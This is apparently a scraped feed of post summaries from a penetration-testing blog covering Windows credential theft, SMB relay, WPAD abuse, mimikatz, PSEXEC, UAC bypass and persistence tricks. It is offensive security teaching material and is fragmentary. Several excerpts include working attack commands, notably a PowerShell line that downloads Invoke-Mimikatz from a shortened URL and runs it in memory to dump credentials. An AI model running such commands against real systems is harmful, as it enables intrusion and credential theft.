      <description>LanManager passwords (&amp;ldquo;LM&amp;rdquo;) is a very old and well known password hashing function. Used way back in OS/2 Warp and MS-Net (networking for MS-DOS). It was great in it&amp;rsquo;s day, however how it worked was not sustainable. The hashing was performed only haver uppercasing and splitting the password into two 7 character chunks. This meant that even if your password was 14 characters long, it was still technically only two 7 character passwords, that could be cracked separately.</description>

      <description>NOTE: I DID NOT ATTEMPT ANYTHING MORE THAN LOGGING AGAINST ANY OF THE DOMAINS I REGISTERED FOR THIS RESEARCH
For anyone who knows me, they know that I&amp;rsquo;ve been obsessed with DNS for a long time. However, in this post I will show results of something I can&amp;rsquo;t quite explain. It all started with the following hypothesis:
Windows systems make DNS/NetBIOS/LLMNR requests to find the domain controllers they logged into even when they are no longer attached to the domain.</description>

      <description>Ever have one of those topics that you know you&amp;rsquo;ve looked up 100 times but never can remember the answer?
I was having one of those moments in a recent conversation on the NoVA Hackers mailing list (If you want to join please read the instructions before requesting to join)
The question came up as to what effect &amp;ldquo;Password Required: No&amp;rdquo; means in a net user UserName is.
As usual, MSDN isn&amp;rsquo;t very helpful:</description>

      <description>With all of the scanning / noise on the Internet, it&amp;rsquo;s nice to get rid of a large chunk of it simply by blocking an entire country&amp;rsquo;s worth of IP space. To do that you can simply use a kernel module for iptables called &amp;ldquo;xtables-addons&amp;rdquo;. On Debian/Ubuntu it&amp;rsquo;s pretty easy to get going, just apt-get install the needed perl library and the addons themselves:
apt-get install libtext-csv-xs-perl xtables-addons-common  !Warning: This does require proper linux headers to be available to compile the kernel module.</description>

      <description>First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true)
TL;DR USB Ethernet + DHCP + Responder == Creds
Thesis: If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked).</description>

      <description>Each year I make up a list the week before Blackhat and Def Con of talks that I &amp;ldquo;can&amp;rsquo;t miss&amp;rdquo; and some that I want to see (and use it for video watching afterwards for those I missed). This year I thought I would share that list here. I will be breaking them down by each day of the events by time slot. Any talk I have a 🌟 by, is a &amp;ldquo;Must see&amp;rdquo; for me.</description>

      <title>Linkedin NXDOMAINs - Purchased Pwnage</title>

      <guid>https://room362.com/post/2016/linkedin-nxdomains/</guid>
      <description>I recently asked a friend if I could have just a list of the domains in the LinkedIn dump, no passwords, not full emails, just domains. I run a program that I lovingly call &amp;ldquo;DeepMagic&amp;rdquo; and I feed it domains whenever I can. Well, this time when I tossed the list of domains into the engine it started spitting out tons of errors. There was a total of 9,436,804 unique domains names in the list, and for anyone who works with DNS that isn&amp;rsquo;t a very big number, so I didn&amp;rsquo;t think very much of it and didn&amp;rsquo;t know why it would choke on a list that small.</description>

      <title>SMB/HTTP Auth Capture via SCF File</title>

      <description>Recently saw a link to an SCF file. Didn&amp;rsquo;t know what those were so I went digging. Turns out they are a simple text based file that controls Windows Explorer. ;-)
Here are the examples I found via the references:
Open Explorer
[Shell] Command = 2 IconFile = explorer.exe, 1 [Taskbar] Command = Explorer  Open &amp;ldquo;Channels&amp;rdquo; page in IE:
[Shell] Command=3 IconFile=shdocvw.dll,-118 [IE] Command=Channels  This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.</description>

      <guid>https://room362.com/post/2016/wpad-persistence/</guid>
      <description>Mostly just writing this so I can keep notes.
Today I came up with the idea to forcibly put the WPAD entry into a Windows Domain&amp;rsquo;s DNS. For those who don&amp;rsquo;t know what this would do there is an entire Wikipedia article on the subject: https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol
I did this via PowerShell pretty easily on one of the domain controllers like so:
PS C:\&amp;gt; Add-DnsServerResourceRecordA -Name wpad -ZoneName sittingduck.info -IPv4Address 107.</description>

      <description>Yes yes yes, I know, another platform, but guess what, it&amp;rsquo;s my blog, so ne-ner-ne-ner-ne-ner
Hugo removed what I didn&amp;rsquo;t like about Octopress (the generating / pushing of content using a mix of branches and such)
The reason I moved from Blogger was I just can&amp;rsquo;t stand having to log in and be online to make posts. I love things like MarsEdit for doing offline posts to services like Blogger, but I never could get the formatting right when I was done, especiall for code, so I&amp;rsquo;m back to a markdown based system.</description>

Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:

Lets just say, when you find the limitations on Amazon&amp;rsquo;s wishlist features for single items, you know you have a problem. My problem? I&amp;rsquo;m kinda addicted to Intel NUCs. They are so versitle, low-ish power consumption, and incredibly powerful and TINY. I carry 3 of these (the older / cheaper ones) around to run my trainings / classes from.
The follow is my current wishlist.</description>

      <description>Meterpreter’s STDAPI extension (the one that always gets loaded) has a new command. This doesn’t happen very often so it’s worth noting.
The new command prints out the currently attached “mounts”. In windows world, that means the normal CD ROM, C drive, etc, but it also means all of the mounted network drives as well.
This gets very interesting when you happen to find yourself in a VM environment where you can start writing files to the host:</description>

If it helps, think of your time as a vault, money is withdrawn at a constant rate by people as you spend it, but you are not allowed to look inside to see how much you have left. It could be a billion dollars, it could be .</description>

I&amp;rsquo;ve had a number of people ask what R5 Industries does. Our primary selling point is AntigenC2, which is a really Command and Control detection product (no agents). But we also do Red Team assessments and some other fun toys if you are interested, contact@r5industries.</description>

If you haven&amp;rsquo;t checked out his &amp;ldquo;Beyond good ol&amp;rsquo; Run key&amp;rdquo; (linked above) 32 post series, you really should. But today I wanted to talk about one that I didn&amp;rsquo;t see up there:
DNVM (https://github.com/aspnet/dnvm) is the DotNet Version Manager and it&amp;rsquo;s a part of ASP.NET 5, which I believe has been inside of Visual Studio since the 2013 version.</description>

If you are, and you go into a presentation, you probably don&amp;rsquo;t want to have all of your icons visible (and possibly recorded). Hiding your desktop icons on Windows (since 7 I believe) is pretty simple.</description>

      <description>AKA - ROB WRITES POWERSHELL!!
Yesterday I posted a way to dump hashes using a Domain Controller account. But how do you know which account to use? And when was it&amp;rsquo;s password last set? net user unfortunately won&amp;rsquo;t do computer accounts.
So I decided to write a PowerShell script to find out. Unfortunately Windows 7 doesn&amp;rsquo;t come with the ActiveDirectory PowerShell module (I&amp;rsquo;m sure there is another way to do this but here is how I did it.</description>

@Carlos_Perez haha, if yes, it will be a 0d ;)
No, like always it needs some rights ;) DA is cool, maybe DC$ is enough

      <description>It’s often tough from both hiring and job hunters to find one another at conferences. I think this is mostly because of a couple things.
 No one wants to stand at a booth on either side and talk job stuff in front of a bunch of people and people at booths rarely get the chance to get away. It’s hard to know “who” to talk to.  So I created a very simple Google doc to help put twitter handles and links together for people who are job hunting and people who are hiring to kinda get to know who to talk to.</description>

      <description>The teflon crew at Pied Piper suffered quite a bit during Season 2 of SILICON VALLEY. But there was no greater indignity than being brought to their knees by a tequila bottle.
Since episode eight “White Hat/Black Hat” aired, many skeptical viewers have asked: how could something like this happen?
Could a mindless error of pressing a delete key really cause a venerable company like Intersite to lose over nine thousand hours of content (including an irreplaceable archive of vintage yiffing videos)?</description>

All the blogging platforms I tried had some major issues that I didn&amp;rsquo;t like. I&amp;rsquo;m sure at some point I&amp;rsquo;ll write about them but this post is mostly just to announce I finally have given up the fight for finding the perfect blogging platform and I&amp;rsquo;m just going to blog on Blogger from now on.</description>

      <description>A while back I needed to set up a pfSense box for CTF/example stuff that didn&amp;rsquo;t and wouldn&amp;rsquo;t ever have Internet connectivity. Doesn&amp;rsquo;t seem like much of a task right? Just pop it in and go. Problem is that you loose the use of the packages that help make pfSense so awesome.
Once I figured it out at that time, I made a Forum post so that anyone running into the same issue wouldn&amp;rsquo;t have to struggle as much:</description>

      <description>Metasploit Minute has entered into it&amp;rsquo;s 3rd &amp;ldquo;season&amp;rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL.</description>

      <description>Update: I originally posted this to the Full Disclosure mailing list but for some reason it wasn&amp;rsquo;t accepted via the moderator so I&amp;rsquo;m posting it here. First, so that the information does get out there, and second to see if anyone knows why it may have been rejected.
I was helping out a family member with their computer when it came up that they &amp;ldquo;already had remote help software&amp;rdquo; (SingleClickConnect or SCC), when I asked what this was, the family member said it was installed by Dell Support when trying to fix their issue.</description>

I am working with OSX Mavericks so your locations may vary based on the version of OSX your target it.
First things first is to enable the PHP module for the Apache server.</description>

      <description>One of the problems with using PSEXEC from Metasploit (any of the psexec modules) is that it runs as SYSTEM. What&amp;rsquo;s the problem with that? Isn&amp;rsquo;t SYSTEM god mode? Ya, and normally I&amp;rsquo;d agree that it&amp;rsquo;s the best level to have, but the defenses these days have gotten better, and getting direct connections out is pretty rare. That leaves proxies, and as you know SYSTEM doesn&amp;rsquo;t get any proxy settings.</description>

      <description>SMB Relay has been around for a long while. I even have a post about using it along with LNK files here:
MS08-068 + MS10-046 = Fun until 2018
Here is the problem though. Most of the tools to exploit it either catch the authentication in NTLMv2/NTLMv1 (which is not always easy to crack) or assume administrative access (because they attempt to PSEXEC with the incoming session). Well, since MS08-068 thats much harder to pin down.</description>

      <description>So there was this blog post that talking about a number of ways to dump windows credentials by @lanjelot [definitly someone to follow] - here: https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ and at the very bottom of this post it says &amp;ldquo;AD Replication (EXPERIMENTAL)&amp;ldquo;
What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it doesn&amp;rsquo;t require code execution in any way on the domain controller.</description>

      <description>PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &amp;ldquo;psexec&amp;rdquo; tools work is:
 (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;rsquo;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.</description>

      <description>Everyone has their list of hostnames they brute force domains with. In my last post I even mentioned a few ways to use one with XARGS or PARALLEL. But one fact about wordlist brute forcing is that there is no &amp;ldquo;one list to rule them all&amp;rdquo;. But over the years of doing DNS record collection I have noticed one thing, most domains have a large number of short hostnames that are easy to remember, usually 4 characters or less.</description>

      <description>Quick update: As @MikeDamm points out, xargs has a -P option that can do the same thing I&amp;rsquo;m using parallel for. If you have a supported version of xargs you can use -P 0 to do the same thing as -j0 with parallel, but if your version doesn&amp;rsquo;t support the 0 you can simply use the same number parallel uses ala:
 cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.</description>

Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp;amp; Matthew Graeber
I highly recommend that you start with this presentation as it lays the foundation for this post.
The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.</description>

      <description>Since I&amp;rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&amp;rsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.</description>

      <description>I&amp;rsquo;ve taken a rather long hiatus from blogging. This is mostly because I was fed up with the blogging platform that I had (Squarespace) and didn&amp;rsquo;t really have any alternatives that met all of the features I wanted.
So, where am I at now? Github actually. Github allows users to create &amp;ldquo;Github Pages&amp;rdquo; for repositories (or be it&amp;rsquo;s own repo). For the most part these pages are written in Markdown. It&amp;rsquo;s late and I don&amp;rsquo;t feel like looking up who, but someone created a project called &amp;ldquo;Jekyll&amp;rdquo; which is a Ruby based static page generator and then another project called &amp;ldquo;Octopress&amp;rdquo; popped up using Jekyll to create a static html based blogging platform.</description>

      <description>clymb3r recently posted a script called &amp;ldquo;Invoke-Mimikatz.ps1&amp;rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
You can very easily use this script directly from an admin command prompt as so:
powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;  (This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.</description>

      <description>cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html
The tired and true method for Zone Transfers are using either nslookup:
nslookup ls -d domain.com.local  Or dig:
dig -t AXFR domain.com.local @ns1.domain.com.local  In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &amp;lsquo;dnscmd&amp;rsquo; command like so:
dnscmd /EnumZones dnscmd /ZonePrint domain.com.local  Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).</description>

      <description>Password Filters [0].aspx&amp;rdquo;) are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages

      <description>If you&amp;rsquo;ve ever used proxychains to push things through Meterpreter, one of the most annoying things is its &amp;ldquo;hardcoded&amp;rdquo; DNS setting for 4.2.2.2, if the org that you are going after doesn&amp;rsquo;t allow this out of their network, or if you are trying to resolve an internal asset, you&amp;rsquo;re SOL. After a ton of googling and annoyed head slams into walls every time I forget where this is I&amp;rsquo;ve finally decided to make a note of it.</description>

Figured I&amp;rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker.</description>

      <description>Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</description>

      <description>Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:</description>

      <description>This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.
Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits.</description>

      <description>You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.</description>

      <description>It seems like every week there is a new compromise of some service or another. But as a user what are you supposed to do with this knowledge? Here are some suggestions on things to do or think about when reacting:
 Do you use the password you use there anywhere else? Think about starting to use a password manager like LastPass, 1Password, KeePass, or a product like Yubico. This way you can very easily use different passwords for different sites.</description>

And a few people came up with some very valid points:
1) Doesn&amp;rsquo;t work so well with HTTPS sites
He&amp;rsquo;s right, but that forces the attack to use SSL, and doing so can yield the defender more information about the attacker, and offer other avenues of defense.</description>

      <description>Drink!!
So I&amp;rsquo;ve been working on a training package that takes a bit of a different approach than what I&amp;rsquo;ve normally done. The training breaks down like this:
 Day 1: Local LAN based exploit (Windows) Day 2: Remote Web based exploit (Linux) Day 3: Client side exploit (Windows) Day 4: Local exploit (FreeBSD) Day 5: Network of the Seven Bells Test  Each day (save for the 5th) will focus on a single exploit, explaining it, running it on virtual machines, and spending 8 hours diving into as many detectable changes that exploit makes on a system.</description>

      <description>Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.
A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost.</description>

      <description>Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole &amp;ldquo;drive&amp;rdquo; is redundant. Easier to just use some Windows voodoo to get a good list to look through offline:
start /b cmd /c dir /b /s \\nas\users_home_share$ ^&amp;gt; shareinfo.txt  Breaking that down:
 start /b - starts a process that won&amp;rsquo;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user!</description>

      <description>You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.
(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)</description>

      <description>Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.
&amp;ldquo;Old&amp;rdquo; module post/windows/escalate/bypassuac:
I decided to give it a bit of a face lift:
&amp;ldquo;New&amp;rdquo; local exploit module exploit/windows/local/bypassuac:
All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.</description>

      <description>Since I didn&amp;rsquo;t see any documentation bringing how to take an LM hash that you&amp;rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.
So there is this: https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp
And this: https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb
And this: http://www.securityfocus.com/tools/6696

      <description>TL;DR – DNSSEC Walker traverses a domain’s DNSSEC records to locate it’s regular DNS records.
I like to go through slides of cons I can’t make it out to, and Hack-in-the-Box (HITB) Kul (Malaysia), was one such as they were very quick to release sides:
http://conference.hitb.org/hitbsecconf2011kul/materials/
One that I came across is Marc “van Hauser” Heuse’s talk on IPv6 titled “IPv6 Insecurity Revolutions” (Link directly to PDF on aforementioned materials link).</description>

      <description>One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)</description>

      <description>Ok, this is pretty straight forward no magic:
Got a shell, doesn&amp;rsquo;t have to be SYSTEM
Add a route to the internal range or directly to the host you want over the session you want
Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.</description>

      <description>UPDATE: THIS IS ONLY WORKS WITH THE LOCAL ADMIN (ID 500) ACCOUNT AND PASSWORD
(MY MISTAKE FOR NOT TESTING MORE)
So the &amp;ldquo;-ish&amp;rdquo; is you need to have the username and pass of another account that has administrator rights the local administrator account on that box. But other than that, the following image should speak for itself. (no UAC prompt occurred during the following actions)
I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute&amp;rsquo;s &amp;lsquo;RunAs&amp;rsquo; verb.</description>

http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html
by @FuzzyNop
Great article showing the use of WCE&amp;rsquo;s &amp;ldquo;-s&amp;rdquo; flag to Pass-The-Hash locally and I highly recommend checking it out. Anywho, I was once in a similar scenario, where I had no Metasploit to back me up, but the box I was on did have one interesting thing, ruby and an accessible target for relatively up-to-date ruby gems. Since Metasploit&amp;rsquo;s powerhouse library &amp;lsquo;rex&amp;rsquo; installed just fine I was set.</description>

      <description>If you follow the exact same steps you did for Netview: /blog/2012/10/07/compiling-and-release-of-netview/
then you already have the steps needed to create a compiled version of ditto from the repo here:
https://github.com/mubix/ditto
And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost:
Size. Now if you&amp;rsquo;re scoffing at 408 KB then you don&amp;rsquo;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring.</description>

Here I&amp;rsquo;ll walk you through compiling Netview yourself, in the next blog post we&amp;rsquo;ll go over compiling Ditto and how you can remove it&amp;rsquo;s icon to reduce the size if you want. But for Netview it&amp;rsquo;s pretty straight forward. First you pull a copy of the GIT repository:

      <description>pfSense is an excellent free way of including a firewall / ids / proxy in your lab or VMs. It runs small and fast, but even as simple as pfsense is sometimes you need a bit less complexity and speed of configuration.
Enter Peerblock and AnalogX&amp;rsquo;s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility.</description>

This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created or just found and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason.</description>

      <description>Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)
Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job.</description>

      <description>One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/) . Wesley&amp;rsquo;s stuff can be found here: http://www.mcgrewsecurity.com/tools/nbnspoof/
Wesley&amp;rsquo;s stuff eventually lead to this awesome post on the Packetstan blog: http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html
and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &amp;ldquo;on-site&amp;rdquo; only attack.</description>

      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>

Things we need to accomplish on the server:
 Listen on all ports Answer for all hostnames and subdomains Answer for all HTTP verbs, file and folder requests  ONE: Listen on all ports
(I used Linux, so this guide is for such, modifications to other OSs is up to the reader)

      <description>Something that is often useful is a known-good. Something out of the control of your adversary or outside modifiers. But back to that in a sec, egress ‘busting’ or getting your payload/backdoor/trojan/c2 out of someone’s network once you’ve gotten that ever elusive “CODE EXECUTION HAPPY DANCE” going on isn’t always easy. There is even a Metasploit payload for it called ‘allports’:
https://community.rapid7.com/community/metasploit/blog/2009/09/24/forcing-payloads-through-restrictive-firewalls
There is also ‘Egress Buster’ by the guys over at TrustedSec which can do 1000 ports in just a few seconds:</description>

      <description>With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.
A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:
w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right?</description>

      <description>Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170
You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):</description>

      <description>@jabjorkhaug posed the following question on Twitter today:
I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:
The service binary that is used as part of PSEXEC is located here:
MSF Directory/data/templates/src/pe/exe/service/service.c
The important part to look at starts at line 57:
#define WIN32_LEAN_AND_MEAN #include &amp;lt;windows.h&amp;gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;; char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.</description>

      <description>Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best.
The first P is Presence. It is first because the attacker needs to get a sense of what he/she has got before they move on.</description>

Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb
I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the GetTcpTable function to railgun:
session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [ [&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;], [&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;], [&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;] ])  Then gauge the size of the table:</description>

      <description>Was messing with the Windows service binaries in Metasploit today and I noticed something unique I hadn&amp;rsquo;t noticed before. For the PSEXEC module, the service name (actually just the display name, &amp;lsquo;service name&amp;rsquo; is random) always started with an uppercase &amp;rsquo;M&amp;rsquo;.
Curious to why that was I looked and found Line 246 of the PSEXEC module to be the culprit:
I can guess why the M is there. Might be just a quirk with old Windows versions that didn&amp;rsquo;t allow lowercase service names, not sure.</description>

      <description>Penetration Testing / Red Teaming requires the use of a lot of tools. I don&amp;rsquo;t mind getting called a &amp;ldquo;script kiddie&amp;rdquo; because I can accomplish more and faster when I don&amp;rsquo;t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks.
(If you&amp;rsquo;ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some.</description>

      <description>One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.</description>

Too bad that nmap&amp;rsquo;s interactive mode was taken out, but there are a great number of other such methods, most notably VI&amp;rsquo;s shell mode. But when I started looking into appending or inserting lines into /etc/sudoers for CCDC, I happened upon an interesting function of that file.

      <description>If you have never heard of PhantomJS ( http://phantomjs.org/ ) before, it&amp;rsquo;s a &amp;ldquo;Full Web Stack with No Browser Required&amp;rdquo;, basically it a GUI-less browser. One of the magical &amp;ldquo;example&amp;rdquo; files that it has is called &amp;ldquo;rasterize.js&amp;rdquo;
Rasterize.JS essentially renders a URL, screen shots it and give it to you in a number of different formats, here&amp;rsquo;s it&amp;rsquo;s usage:
Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat] paper (pdf output) examples: &amp;quot;5in*7.5in&amp;quot;, &amp;quot;10cm*20cm&amp;quot;, &amp;quot;A4&amp;quot;, &amp;quot;Letter&amp;quot;  PhantomJS is sweet for sweeping a ton of IPs and suspected HTTP/S sites, and look through a gallery of them to start figuring out which looks the most interesting… and we are going to essentially just that, except from a Victim machine.</description>

      <description>At CCDC, Sticky Keys via RDP was a very successful re-entry point for the Red Team. You can read more about how this works here:
http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html
So if you can get physical access or SYSTEM/Admin access at some point and enable + reach RDP, you can very easily follow those instructions and gain a level of persistance without the need of a pesky password :-)
However, this doesn&amp;rsquo;t work so well with the advent of NLA or Network-Level-Authentication, which was enabled for Vista systems and beyond.</description>

